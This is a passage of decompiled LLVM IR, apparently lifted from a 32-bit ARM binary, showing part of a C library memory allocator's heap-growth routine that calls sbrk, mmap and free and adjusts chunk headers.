  %v3_1bbc8 = inttoptr i32 %v6_1bb98 to i32*
  store i32 0, i32* %v3_1bbc8, align 4
  %v1_1bbcc = load i32, i32* %r3.global-to-local, align 4
  %v2_1bbcc = load i32, i32* %lr.global-to-local, align 4
  %v3_1bbcc = add i32 %v2_1bbcc, 4
  %v4_1bbcc = inttoptr i32 %v3_1bbcc to i32*
  store i32 %v1_1bbcc, i32* %v4_1bbcc, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1bbd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1bbd8, i32* %ip.global-to-local, align 4
  %v1_1bbdc = add i32 %v4_1bbd8, 848
  %v2_1bbdc = inttoptr i32 %v1_1bbdc to i32*
  %v3_1bbdc = load i32, i32* %v2_1bbdc, align 4
  store i32 %v3_1bbdc, i32* %r3.global-to-local, align 4
  %v1_1bbe0 = add i32 %v4_1bbd8, 856
  %v2_1bbe0 = inttoptr i32 %v1_1bbe0 to i32*
  %v3_1bbe0 = load i32, i32* %v2_1bbe0, align 4
  store i32 %v3_1bbe0, i32* %r2.global-to-local, align 4
  %v1_1bbe4 = add i32 %v3_1bbdc, 1
  store i32 %v1_1bbe4, i32* %r3.global-to-local, align 4
  %v7_1bbec = icmp sgt i32 %v1_1bbe4, %v3_1bbe0
  br i1 %v7_1bbec, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_1bbe4, i32* %v2_1bbe0, align 4
  %v0_1bbf0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1bbf0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_1bbf0 = phi i32 [ %v4_1bbd8, %.thread27 ], [ %v1_1bbf0.pre, %bb147 ]
  %v0_1bbf0 = phi i32 [ %v1_1bbe4, %.thread27 ], [ %v0_1bbf0.pre, %bb147 ]
  %v2_1bbf0 = add i32 %v1_1bbf0, 848
  %v3_1bbf0 = inttoptr i32 %v2_1bbf0 to i32*
  store i32 %v0_1bbf0, i32* %v3_1bbf0, align 4
  %v0_1bbf4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1bbf4 = add i32 %v0_1bbf4, 868
  %v2_1bbf4 = inttoptr i32 %v1_1bbf4 to i32*
  %v3_1bbf4 = load i32, i32* %v2_1bbf4, align 4
  store i32 %v3_1bbf4, i32* %r3.global-to-local, align 4
  %v1_1bbf8 = add i32 %v0_1bbf4, 880
  %v2_1bbf8 = inttoptr i32 %v1_1bbf8 to i32*
  %v3_1bbf8 = load i32, i32* %v2_1bbf8, align 4
  store i32 %v3_1bbf8, i32* %r2.global-to-local, align 4
  %v0_1bbfc = load i32, i32* @r4, align 4
  %v2_1bbfc = add i32 %v0_1bbfc, %v3_1bbf4
  store i32 %v2_1bbfc, i32* %r1.global-to-local, align 4
  %v1_1bc00 = add i32 %v0_1bbf4, 872
  %v2_1bc00 = inttoptr i32 %v1_1bc00 to i32*
  %v3_1bc00 = load i32, i32* %v2_1bc00, align 4
  store i32 %v3_1bc00, i32* %r3.global-to-local, align 4
  %v1_1bc08 = add i32 %v0_1bbf4, 884
  %v2_1bc08 = inttoptr i32 %v1_1bc08 to i32*
  %v3_1bc08 = load i32, i32* %v2_1bc08, align 4
  store i32 %v3_1bc08, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_1bbfc, %v3_1bbf8
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_1bbfc, i32* %v2_1bbf8, align 4
  %v0_1bc10.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1bc10.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_1bc10 = phi i32 [ %v0_1bbf4, %bb148 ], [ %v1_1bc10.pre, %bb149 ]
  %v0_1bc10 = phi i32 [ %v2_1bbfc, %bb148 ], [ %v0_1bc10.pre, %bb149 ]
  %v2_1bc10 = add i32 %v1_1bc10, 868
  %v3_1bc10 = inttoptr i32 %v2_1bc10 to i32*
  store i32 %v0_1bc10, i32* %v3_1bc10, align 4
  %v0_1bc14 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bc14 = load i32, i32* %r3.global-to-local, align 4
  %v2_1bc14 = add i32 %v1_1bc14, %v0_1bc14
  store i32 %v2_1bc14, i32* %r1.global-to-local, align 4
  %v1_1bc18 = load i32, i32* %r2.global-to-local, align 4
  %v0_1bc1c = load i32, i32* %lr.global-to-local, align 4
  %v1_1bc1c = add i32 %v0_1bc1c, 8
  store i32 %v1_1bc1c, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_1bc14, %v1_1bc18
  br i1 %tmp213, label %bb151, label %dec_label_pc_1bf30

bb151:                                            ; preds = %bb150
  %v5_1bc20 = load i32, i32* %ip.global-to-local, align 4
  %v6_1bc20 = add i32 %v5_1bc20, 884
  %v7_1bc20 = inttoptr i32 %v6_1bc20 to i32*
  store i32 %v2_1bc14, i32* %v7_1bc20, align 4
  br label %dec_label_pc_1bf30

dec_label_pc_1bc28:                               ; preds = %dec_label_pc_1bb6c, %dec_label_pc_1bb4c, %dec_label_pc_1bb80.dec_label_pc_1bc28_crit_edge, %dec_label_pc_1bb5c
  %v1_1bc4c = phi i32 [ %v1_1bc4c.pre, %dec_label_pc_1bb80.dec_label_pc_1bc28_crit_edge ], [ %v0_1baf4, %dec_label_pc_1bb5c ], [ %v0_1baf4, %dec_label_pc_1bb4c ], [ %v0_1baf4, %dec_label_pc_1bb6c ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %ip.global-to-local, align 4
  %v4_1bc30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1bc30, i32* %r3.global-to-local, align 4
  %v1_1bc34 = add i32 %v4_1bc30, 44
  %v2_1bc34 = inttoptr i32 %v1_1bc34 to i32*
  %v3_1bc34 = load i32, i32* %v2_1bc34, align 4
  store i32 %v3_1bc34, i32* %r0.global-to-local, align 4
  %v1_1bc38 = add i32 %v4_1bc30, 864
  %v2_1bc38 = inttoptr i32 %v1_1bc38 to i32*
  %v3_1bc38 = load i32, i32* %v2_1bc38, align 4
  store i32 %v3_1bc38, i32* %r2.global-to-local, align 4
  %v1_1bc3c = add i32 %v4_1bc30, 840
  %v2_1bc3c = inttoptr i32 %v1_1bc3c to i32*
  %v3_1bc3c = load i32, i32* %v2_1bc3c, align 4
  store i32 %v3_1bc3c, i32* %r3.global-to-local, align 4
  %v1_1bc40 = add i32 %v3_1bc34, 4
  %v2_1bc40 = inttoptr i32 %v1_1bc40 to i32*
  %v3_1bc40 = load i32, i32* %v2_1bc40, align 4
  store i32 %v3_1bc40, i32* %r1.global-to-local, align 4
  %v1_1bc48 = urem i32 %v3_1bc38, 2
  %v2_1bc48 = icmp eq i32 %v1_1bc48, 0
  %v1_1bc44 = add i32 %v1_1bc4c, 16
  %v2_1bc4c = add i32 %v1_1bc44, %v3_1bc3c
  store i32 %v2_1bc4c, i32* %r3.global-to-local, align 4
  %v1_1bc50 = and i32 %v3_1bc40, -4
  store i32 %v1_1bc50, i32* @r8, align 4
  br i1 %v2_1bc48, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_1bc28
  %v3_1bc54 = sub i32 %v2_1bc4c, %v1_1bc50
  store i32 %v3_1bc54, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_1bc28, %bb152
  %v0_1bc58 = phi i32 [ %v2_1bc4c, %dec_label_pc_1bc28 ], [ %v3_1bc54, %bb152 ]
  %v1_1bc58 = load i32, i32* %sb.global-to-local, align 4
  %v2_1bc58 = add i32 %v1_1bc58, %v0_1bc58
  store i32 %v2_1bc58, i32* %r3.global-to-local, align 4
  %v1_1bc5c = sub i32 -1, %v1_1bc58
  store i32 %v1_1bc5c, i32* %fp.global-to-local, align 4
  %v2_1bc60 = and i32 %v2_1bc58, %v1_1bc5c
  store i32 %v2_1bc60, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_1bc60, 1
  br i1 %tmp154, label %dec_label_pc_1bc84, label %dec_label_pc_1bc70

dec_label_pc_1bc70:                               ; preds = %bb153
  store i32 %v2_1bc60, i32* %r0.global-to-local, align 4
  %v1_1bc74 = call i32 @__GI_sbrk(i32 %v2_1bc60)
  store i32 %v1_1bc74, i32* %r0.global-to-local, align 4
  %v3_1bc78 = icmp eq i32 %v1_1bc74, -1
  store i32 %v1_1bc74, i32* @r4, align 4
  br i1 %v3_1bc78, label %dec_label_pc_1bc84, label %dec_label_pc_1bcf0

dec_label_pc_1bc84:                               ; preds = %dec_label_pc_1bc70, %bb153
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r1.global-to-local, align 4
  %v4_1bc8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1bc8c, i32* %r6.global-to-local, align 4
  %v1_1bc90 = add i32 %v4_1bc8c, 864
  %v2_1bc90 = inttoptr i32 %v1_1bc90 to i32*
  %v3_1bc90 = load i32, i32* %v2_1bc90, align 4
  store i32 %v3_1bc90, i32* %r3.global-to-local, align 4
  %v1_1bc94 = urem i32 %v3_1bc90, 2
  %v2_1bc94 = icmp eq i32 %v1_1bc94, 0
  br i1 %v2_1bc94, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_1bc84
  %v1_1bc98 = load i32, i32* @r8, align 4
  %v2_1bc98 = load i32, i32* %sb.global-to-local, align 4
  %v3_1bc98 = add i32 %v2_1bc98, %v1_1bc98
  %v2_1bc9c = load i32, i32* @r5, align 4
  %v3_1bc9c = add i32 %v3_1bc98, %v2_1bc9c
  store i32 %v3_1bc9c, i32* %r3.global-to-local, align 4
  %v2_1bca0 = load i32, i32* %fp.global-to-local, align 4
  %v3_1bca0 = and i32 %v2_1bca0, %v3_1bc9c
  store i32 %v3_1bca0, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_1bc84
  %v0_1bca4.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_1bca4 = phi i32 [ %v0_1bca4.pr, %.thread29thread-pre-split ], [ %v3_1bca0, %bb155 ]
  %v2_1bca4 = icmp ugt i32 %v0_1bca4, 1048575
  br i1 %v2_1bca4, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_1bcbc = phi i32 [ %v0_1bca4, %.thread29 ], [ 1048576, %bb156 ]
  %v1_1bcac = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_1bcbc, %v1_1bcac
  br i1 %tmp214, label %dec_label_pc_1bcb4, label %dec_label_pc_1bf18

dec_label_pc_1bcb4:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1bcbc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1bcd0 = call i32 @mmap(i32 0, i32 %v0_1bcbc, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1bcd0, i32* %r0.global-to-local, align 4
  %v3_1bcd4 = icmp eq i32 %v6_1bcd0, -1
  %v8_1bcd4 = icmp eq i32 %v6_1bcd0, -1
  store i32 %v6_1bcd0, i32* @r4, align 4
  br i1 %v8_1bcd4, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_1bcb4
  %v1_1bcdc = load i32, i32* %r6.global-to-local, align 4
  %v2_1bcdc = add i32 %v1_1bcdc, 864
  %v3_1bcdc = inttoptr i32 %v2_1bcdc to i32*
  %v4_1bcdc = load i32, i32* %v3_1bcdc, align 4
  %v2_1bce0 = load i32, i32* @r5, align 4
  %v3_1bce0 = add i32 %v2_1bce0, %v6_1bcd0
  store i32 %v3_1bce0, i32* %r0.global-to-local, align 4
  %v2_1bce4 = and i32 %v4_1bcdc, -2
  store i32 %v2_1bce4, i32* %r3.global-to-local, align 4
  store i32 %v2_1bce4, i32* %v3_1bcdc, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_1bcb4, %bb158
  br i1 %v3_1bcd4, label %dec_label_pc_1bcf0, label %dec_label_pc_1bcf4

dec_label_pc_1bcf0:                               ; preds = %.thread32, %dec_label_pc_1bc70
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bcf4

dec_label_pc_1bcf4:                               ; preds = %.thread32, %dec_label_pc_1bcf0
  %v0_1bcf4 = load i32, i32* @r4, align 4
  %v7_1bcf4 = icmp eq i32 %v0_1bcf4, -1
  br i1 %v7_1bcf4, label %dec_label_pc_1bf18, label %dec_label_pc_1bcfc

dec_label_pc_1bcfc:                               ; preds = %dec_label_pc_1bcf4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v4_1bd04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1bd04, i32* %ip.global-to-local, align 4
  store i32 %v3_1bc34, i32* %r2.global-to-local, align 4
  %v1_1bd0c = add i32 %v4_1bd04, 872
  %v2_1bd0c = inttoptr i32 %v1_1bd0c to i32*
  %v3_1bd0c = load i32, i32* %v2_1bd0c, align 4
  %v1_1bd10 = load i32, i32* @r8, align 4
  %v2_1bd10 = add i32 %v1_1bd10, %v3_1bc34
  store i32 %v2_1bd10, i32* %r1.global-to-local, align 4
  %v0_1bd14 = load i32, i32* @r5, align 4
  %v2_1bd14 = add i32 %v0_1bd14, %v3_1bd0c
  store i32 %v2_1bd14, i32* %r3.global-to-local, align 4
  %v9_1bd18 = icmp eq i32 %v0_1bcf4, %v2_1bd10
  br i1 %v9_1bd18, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_1bcfc
  store i32 %v2_1bd14, i32* %v2_1bd0c, align 4
  br label %dec_label_pc_1bd34

bb159:                                            ; preds = %dec_label_pc_1bcfc
  %v1_1bd1c = load i32, i32* %r0.global-to-local, align 4
  %v8_1bd1c = icmp eq i32 %v1_1bd1c, -1
  store i32 %v2_1bd14, i32* %v2_1bd0c, align 4
  br i1 %v8_1bd1c, label %.thread34, label %dec_label_pc_1bd34

.thread34:                                        ; preds = %bb159
  %v1_1bd24 = load i32, i32* @r5, align 4
  %v2_1bd24 = load i32, i32* @r8, align 4
  %v3_1bd24 = add i32 %v2_1bd24, %v1_1bd24
  %v2_1bd28 = or i32 %v3_1bd24, 1
  store i32 %v2_1bd28, i32* %r3.global-to-local, align 4
  %v2_1bd2c = load i32, i32* %r2.global-to-local, align 4
  %v3_1bd2c = add i32 %v2_1bd2c, 4
  %v4_1bd2c = inttoptr i32 %v3_1bd2c to i32*
  store i32 %v2_1bd28, i32* %v4_1bd2c, align 4
  br label %dec_label_pc_1beac

dec_label_pc_1bd34:                               ; preds = %bb159, %.thread122
  %v0_1bd38.pr = load i32, i32* @r8, align 4
  %v0_1bd34 = load i32, i32* %ip.global-to-local, align 4
  %v1_1bd34 = add i32 %v0_1bd34, 864
  %v2_1bd34 = inttoptr i32 %v1_1bd34 to i32*
  %v3_1bd34 = load i32, i32* %v2_1bd34, align 4
  store i32 %v3_1bd34, i32* %r2.global-to-local, align 4
  %v2_1bd38 = icmp eq i32 %v0_1bd38.pr, 0
  br i1 %v2_1bd38, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_1bd34
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_1bd34
  %v2_1bd40 = urem i32 %v3_1bd34, 2
  store i32 %v2_1bd40, i32* %r3.global-to-local, align 4
  %v2_1bd44 = icmp eq i32 %v2_1bd40, 0
  br i1 %v2_1bd44, label %.thread40, label %dec_label_pc_1bd4c

dec_label_pc_1bd4c:                               ; preds = %.thread36
  %v0_1bd4c = load i32, i32* @r4, align 4
  %v1_1bd4c = load i32, i32* %r1.global-to-local, align 4
  %v3_1bd4c = icmp ult i32 %v0_1bd4c, %v1_1bd4c
  br i1 %v3_1bd4c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_1bd4c
  %v2_1bd50 = and i32 %v3_1bd34, -2
  store i32 %v2_1bd50, i32* %r3.global-to-local, align 4
  store i32 %v2_1bd50, i32* %v2_1bd34, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_1bd4c, %.thread37, %.thread36, %bb160
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %ip.global-to-local, align 4
  %v4_1bd60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1bd60, i32* @r7, align 4
  %v1_1bd64 = add i32 %v4_1bd60, 864
  %v2_1bd64 = inttoptr i32 %v1_1bd64 to i32*
  %v3_1bd64 = load i32, i32* %v2_1bd64, align 4
  store i32 %v3_1bd64, i32* %r3.global-to-local, align 4
  %v1_1bd68 = urem i32 %v3_1bd64, 2
  store i32 %v1_1bd68, i32* @r6, align 4
  %v2_1bd68 = icmp eq i32 %v1_1bd68, 0
  br i1 %v2_1bd68, label %dec_label_pc_1bdfc, label %dec_label_pc_1bd70

dec_label_pc_1bd70:                               ; preds = %.thread40
  %v0_1bd70 = load i32, i32* @r8, align 4
  %v2_1bd70 = icmp eq i32 %v0_1bd70, 0
  br i1 %v2_1bd70, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_1bd70
  %v2_1bd74 = add i32 %v4_1bd60, 872
  %v3_1bd74 = inttoptr i32 %v2_1bd74 to i32*
  %v4_1bd74 = load i32, i32* %v3_1bd74, align 4
  store i32 %v4_1bd74, i32* %r2.global-to-local, align 4
  %v1_1bd78 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bd78 = load i32, i32* @r4, align 4
  %v3_1bd78 = sub i32 %v2_1bd78, %v1_1bd78
  %v3_1bd7c = add i32 %v3_1bd78, %v4_1bd74
  store i32 %v3_1bd7c, i32* %r3.global-to-local, align 4
  store i32 %v3_1bd7c, i32* %v3_1bd74, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_1bd70, %bb161
  %v0_1bd84 = load i32, i32* @r4, align 4
  %v1_1bd84 = urem i32 %v0_1bd84, 8
  store i32 %v1_1bd84, i32* %r3.global-to-local, align 4
  %v2_1bd84 = icmp eq i32 %v1_1bd84, 0
  br i1 %v2_1bd84, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_1bd88 = sub nsw i32 8, %v1_1bd84
  store i32 %v2_1bd88, i32* %r3.global-to-local, align 4
  %v3_1bd8c = add i32 %v2_1bd88, %v0_1bd84
  store i32 %v3_1bd8c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_1bd94 = phi i32 [ 0, %.thread43 ], [ %v2_1bd88, %bb162 ]
  %v1_1bd90 = load i32, i32* @r5, align 4
  %v2_1bd90 = add i32 %v1_1bd90, %v0_1bd84
  store i32 %v2_1bd90, i32* @r6, align 4
  %v1_1bd94 = load i32, i32* @r8, align 4
  %v2_1bd94 = add i32 %v2_1bd90, %v0_1bd94
  %v2_1bd98 = add i32 %v2_1bd94, %v1_1bd94
  store i32 %v2_1bd98, i32* %r1.global-to-local, align 4
  %v1_1bd9c = load i32, i32* %sb.global-to-local, align 4
  %v2_1bd9c = add i32 %v1_1bd9c, %v2_1bd98
  %v1_1bda0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1bda0 = and i32 %v1_1bda0, %v2_1bd9c
  store i32 %v2_1bda0, i32* %r2.global-to-local, align 4
  %v2_1bda4 = sub i32 0, %v2_1bd90
  store i32 %v2_1bda4, i32* %r3.global-to-local, align 4
  %v2_1bda8 = sub i32 %v2_1bda0, %v2_1bd90
  store i32 %v2_1bda8, i32* @r5, align 4
  store i32 %v2_1bda8, i32* %r0.global-to-local, align 4
  br i1 %v2_1bd84, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_1bd84, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_1bdb4 = call i32 @__GI_sbrk(i32 %v2_1bda8)
  store i32 %v1_1bdb4, i32* %r0.global-to-local, align 4
  %v3_1bdb8 = icmp eq i32 %v1_1bdb4, -1
  br i1 %v3_1bdb8, label %dec_label_pc_1bdc0, label %dec_label_pc_1bdd0

dec_label_pc_1bdc0:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1bdc4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1bdc4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1be28

dec_label_pc_1bdd0:                               ; preds = %bb164
  %v1_1bdd0 = load i32, i32* @r4, align 4
  %v3_1bdd0 = icmp ult i32 %v1_1bdb4, %v1_1bdd0
  br i1 %v3_1bdd0, label %dec_label_pc_1bdd8, label %dec_label_pc_1be28

dec_label_pc_1bdd8:                               ; preds = %dec_label_pc_1bdd0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r0.global-to-local, align 4
  %v4_1bde0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1bde0, i32* %r2.global-to-local, align 4
  %v1_1bde4 = add i32 %v4_1bde0, 864
  %v2_1bde4 = inttoptr i32 %v1_1bde4 to i32*
  %v3_1bde4 = load i32, i32* %v2_1bde4, align 4
  %v0_1bde8 = load i32, i32* @r6, align 4
  store i32 %v0_1bde8, i32* %r0.global-to-local, align 4
  %v1_1bdec = and i32 %v3_1bde4, -2
  store i32 %v1_1bdec, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_1bdec, i32* %v2_1bde4, align 4
  br label %dec_label_pc_1be28

dec_label_pc_1bdfc:                               ; preds = %.thread40
  %v0_1bdfc = load i32, i32* %r0.global-to-local, align 4
  %v3_1bdfc = icmp eq i32 %v0_1bdfc, -1
  br i1 %v3_1bdfc, label %dec_label_pc_1be04, label %dec_label_pc_1be20

dec_label_pc_1be04:                               ; preds = %dec_label_pc_1bdfc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1be08 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1be08, i32* %r0.global-to-local, align 4
  %v0_1be0c = load i32, i32* @r7, align 4
  %v1_1be0c = add i32 %v0_1be0c, 872
  %v2_1be0c = inttoptr i32 %v1_1be0c to i32*
  %v3_1be0c = load i32, i32* %v2_1be0c, align 4
  store i32 %v3_1be0c, i32* %r2.global-to-local, align 4
  %v0_1be10 = load i32, i32* @r4, align 4
  %v0_1be14 = load i32, i32* @r5, align 4
  %v2_1be10 = add i32 %v3_1be0c, %v1_1be08
  %v2_1be14 = sub i32 %v2_1be10, %v0_1be10
  %v2_1be18 = sub i32 %v2_1be14, %v0_1be14
  store i32 %v2_1be18, i32* %r3.global-to-local, align 4
  store i32 %v2_1be18, i32* %v2_1be0c, align 4
  %v0_1be24.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1be20

dec_label_pc_1be20:                               ; preds = %dec_label_pc_1bdfc, %dec_label_pc_1be04
  %v0_1be24 = phi i32 [ 0, %dec_label_pc_1bdfc ], [ %v0_1be24.pre, %dec_label_pc_1be04 ]
  %v0_1be20 = load i32, i32* @r4, align 4
  store i32 %v0_1be20, i32* @r7, align 4
  store i32 %v0_1be24, i32* @r5, align 4
  br label %dec_label_pc_1be28

dec_label_pc_1be28:                               ; preds = %dec_label_pc_1bdd0, %dec_label_pc_1bdd8, %dec_label_pc_1bdc0, %dec_label_pc_1be20
  %v0_1be28 = load i32, i32* %r0.global-to-local, align 4
  %v7_1be28 = icmp eq i32 %v0_1be28, -1
  br i1 %v7_1be28, label %dec_label_pc_1beac, label %dec_label_pc_1be30

dec_label_pc_1be30:                               ; preds = %dec_label_pc_1be28
  %v1_1be30 = load i32, i32* @r5, align 4
  %v2_1be30 = add i32 %v1_1be30, %v0_1be28
  %v0_1be34 = load i32, i32* @r7, align 4
  %v2_1be34 = sub i32 %v2_1be30, %v0_1be34
  %v1_1be38 = or i32 %v2_1be34, 1
  %v2_1be3c = add i32 %v0_1be34, 4
  %v3_1be3c = inttoptr i32 %v2_1be3c to i32*
  store i32 %v1_1be38, i32* %v3_1be3c, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1be48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1be48, i32* @r6, align 4
  %v1_1be4c = add i32 %v4_1be48, 872
  %v2_1be4c = inttoptr i32 %v1_1be4c to i32*
  %v3_1be4c = load i32, i32* %v2_1be4c, align 4
  %v0_1be50 = load i32, i32* @r8, align 4
  %v2_1be50 = icmp eq i32 %v0_1be50, 0
  %v0_1be54 = load i32, i32* @r5, align 4
  %v2_1be54 = add i32 %v0_1be54, %v3_1be4c
  store i32 %v2_1be54, i32* %r3.global-to-local, align 4
  store i32 %v2_1be54, i32* %v2_1be4c, align 4
  %v0_1be5c = load i32, i32* @r7, align 4
  %v1_1be5c = load i32, i32* @r6, align 4
  %v2_1be5c = add i32 %v1_1be5c, 44
  %v3_1be5c = inttoptr i32 %v2_1be5c to i32*
  store i32 %v0_1be5c, i32* %v3_1be5c, align 4
  br i1 %v2_1be50, label %dec_label_pc_1beac, label %dec_label_pc_1be64

dec_label_pc_1be64:                               ; preds = %dec_label_pc_1be30
  %v0_1be68 = load i32, i32* @r8, align 4
  %v1_1be68 = add i32 %v0_1be68, -12
  %v1_1be6c = and i32 %v1_1be68, -8
  store i32 %v3_1bc34, i32* %ip.global-to-local, align 4
  %v2_1be74 = add i32 %v1_1be6c, %v3_1bc34
  store i32 %v2_1be74, i32* %r1.global-to-local, align 4
  %v2_1be78 = icmp ugt i32 %v1_1be6c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_1be80 = or i32 %v1_1be6c, 1
  store i32 %v1_1be80, i32* %r3.global-to-local, align 4
  store i32 %v1_1be80, i32* %v2_1bc40, align 4
  %v0_1be88 = load i32, i32* %r2.global-to-local, align 4
  %v1_1be88 = load i32, i32* %r1.global-to-local, align 4
  %v2_1be88 = add i32 %v1_1be88, 8
  %v3_1be88 = inttoptr i32 %v2_1be88 to i32*
  store i32 %v0_1be88, i32* %v3_1be88, align 4
  %v0_1be8c = load i32, i32* %r2.global-to-local, align 4
  %v1_1be8c = load i32, i32* %r1.global-to-local, align 4
  %v2_1be8c = add i32 %v1_1be8c, 4
  %v3_1be8c = inttoptr i32 %v2_1be8c to i32*
  store i32 %v0_1be8c, i32* %v3_1be8c, align 4
  br i1 %v2_1be78, label %dec_label_pc_1be94, label %dec_label_pc_1beac

dec_label_pc_1be94:                               ; preds = %dec_label_pc_1be64
  %v0_1be94 = load i32, i32* @r6, align 4
  %v1_1be94 = add i32 %v0_1be94, 836
  %v2_1be94 = inttoptr i32 %v1_1be94 to i32*
  %v3_1be94 = load i32, i32* %v2_1be94, align 4
  store i32 %v3_1be94, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1be9c = load i32, i32* %ip.global-to-local, align 4
  %v1_1be9c = add i32 %v0_1be9c, 8
  store i32 %v1_1be9c, i32* @r0, align 4
  store i32 -1, i32* %v2_1be94, align 4
  %v0_1bea4 = call i32 @free()
  store i32 %v0_1bea4, i32* %r0.global-to-local, align 4
  %v0_1bea8 = load i32, i32* @r4, align 4
  %v1_1bea8 = load i32, i32* @r6, align 4
  %v2_1bea8 = add i32 %v1_1bea8, 836
  %v3_1bea8 = inttoptr i32 %v2_1bea8 to i32*
  store i32 %v0_1bea8, i32* %v3_1bea8, align 4
  br label %dec_label_pc_1beac

dec_label_pc_1beac:                               ; preds = %.thread34, %dec_label_pc_1be64, %dec_label_pc_1be30, %dec_label_pc_1be28, %dec_label_pc_1be94
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r0.global-to-local, align 4
  %v4_1beb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 64) to i32*), align 4
  store i32 %v4_1beb4, i32* %lr.global-to-local, align 4
  %v1_1beb8 = add i32 %v4_1beb4, 872
  store i32 %v1_1beb8, i32* %r1.global-to-local, align 4
  %v1_1bebc = inttoptr i32 %v1_1beb8 to i32*
  %v2_1bebc = load i32, i32* %v1_1bebc, align 4
  store i32 %v2_1bebc, i32* %r1.global-to-local, align 4
  %v3_1bebc = add i32 %v4_1beb4, 876
  %v4_1bebc = inttoptr i32 %v3_1bebc to i32*
  %v5_1bebc = load i32, i32* %v4_1bebc, align 4
